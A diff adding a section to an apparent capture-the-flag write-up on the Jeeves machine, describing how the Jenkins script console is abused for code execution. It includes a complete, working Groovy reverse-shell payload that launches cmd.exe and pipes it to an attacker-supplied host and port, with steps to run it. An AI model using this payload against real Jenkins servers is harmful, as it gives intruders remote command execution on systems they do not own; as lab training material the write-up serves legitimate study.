@@ -57,5 +57,23 @@ So, after visitin this page and looking around things, in __"Manage Jenkins"__ t
 ## Reverse Shell
 Knowing that we can do some exploitation with the script console in Jenkins. There are couple methods to get a reverse shell where I'll share two. 
 
+### Reverse Shell - Method #1
+After googling around things such as "jenkins language scripting" or "jenkins reverse shell" there is information that says that the langauage used to execute scripts in the console is called groovy. So, from this language the reverse shell obtained came from ["frohoff"](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) on github. 
+
+```
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+Then, adding this code and replace "localhost" for our IP and cliking "Run" I got a reverse shell!
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/reverse-shell1.png" alt="Reverse Shell #1">
+
+and wollah!
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/netcat-shell.png" alt="NetCat Shell #1">
+
 
 
